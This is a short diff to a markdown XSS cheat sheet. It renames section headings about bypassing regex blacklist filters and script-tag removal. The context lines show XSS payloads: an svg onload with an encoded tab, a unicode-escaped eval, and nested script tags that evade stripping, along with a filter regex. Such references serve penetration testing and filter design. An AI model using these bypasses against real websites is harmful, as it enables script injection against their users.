@@ -181,7 +181,7 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 ### Regex Blacklist Filtering
 
--> Bypassing Filter blocking on - Bypass
+-> Filter blocking on - Bypass  
 `(on\w+\s*=)`  
 ```
 <svg onload%09=alert(1)> 
@@ -201,7 +201,7 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 <script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
 ```
 
-#### Removing script Tag
+#### Removing script Tag - Bypass
   
 `<sCR<script>iPt>alert(1)</SCr</script>IPt>`
 
